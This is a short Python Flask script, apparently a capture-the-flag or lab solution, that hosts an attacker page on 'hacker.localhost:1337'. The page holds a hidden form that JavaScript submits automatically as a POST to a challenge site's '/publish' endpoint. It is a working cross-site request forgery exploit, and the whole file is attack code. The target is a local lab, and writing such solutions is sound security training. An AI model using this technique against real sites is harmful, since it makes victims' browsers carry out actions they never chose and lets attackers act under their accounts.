import flask

HOST = 'hacker.localhost'
PORT = 1337
TARGET = 'http://challenge.localhost/publish'

app = flask.Flask(__name__)

@app.route("/")
def home():
  return f'''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>You spawned!</title>
    </head>
    <body>
      <form id="pwn" method="post" action="{TARGET}">
      </form>
        <script>
          document.getElementById('pwn').submit()
        </script>
    </body>
    </html>
    '''

app.config['SERVER_NAME'] = 'hacker.localhost:1337'
app.run(HOST, PORT)